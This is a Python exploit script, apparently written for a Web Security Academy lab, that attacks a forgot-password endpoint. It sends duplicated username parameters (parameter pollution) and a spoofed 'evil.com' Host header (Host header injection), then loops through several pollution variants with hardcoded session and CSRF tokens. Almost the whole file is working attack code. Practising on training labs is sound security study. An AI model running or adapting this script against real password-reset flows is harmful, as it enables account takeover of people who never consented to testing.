#!/usr/bin/env python3
import requests

url = "https://0a0a004e034f7a8182e93d0c004d00b7.web-security-academy.net/forgot-password"
session = "34ERCypmj8Hg3MDNkK4ULVsD1BVFXsrL"

headers = {
    "Cookie": f"session={session}",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Accept": "*/*",
    "Host": "evil.com"  # Attempting Host header injection too
}

# Exploit: The front-end validation checks 'administrator' but backend uses 'carlos'
# This bypasses any client-side restrictions while targeting the admin account
payload = "csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator&username=carlos"

print("Exploiting Parameter Pollution Vulnerability...")
print("=" * 50)
print(f"Target: {url}")
print(f"Payload: {payload}")
print()

try:
    response = requests.post(url, data=payload, headers=headers, verify=False)
    result = response.text

    print(f"Response: {result}")
    print(f"Status Code: {response.status_code}")

    # Check what happened
    if "carlos-montoya.net" in result:
        print("\n✓ SUCCESS: Parameter pollution worked!")
        print("- Frontend saw 'administrator' parameter")
        print("- Backend processed 'carlos' parameter")
        print("- Password reset triggered for carlos instead of admin")
        print("\nThis bypasses frontend validation while targeting a different user!")

    elif "administrator" in result or "admin" in result:
        print("\n? Mixed results - check manually")

    else:
        print(f"\n? Unexpected response: {result}")

except Exception as e:
    print(f"Error: {e}")

# Test other variations
print("\n" + "=" * 50)
print("Testing other pollution patterns...")

variations = [
    ("username=administrator&username=carlos&username=wiener", "Triple parameter"),
    ("username=administrator&csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=carlos", "Mixed order"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator%26username%3Dcarlos", "URL encoded"),
]

for payload, desc in variations:
    try:
        response = requests.post(url, data=payload, headers=headers, verify=False)
        result = response.text
        if "carlos" in result:
            print(f"✓ {desc}: {result}")
        elif response.status_code != 200:
            print(f"? {desc}: HTTP {response.status_code}")
    except:
        pass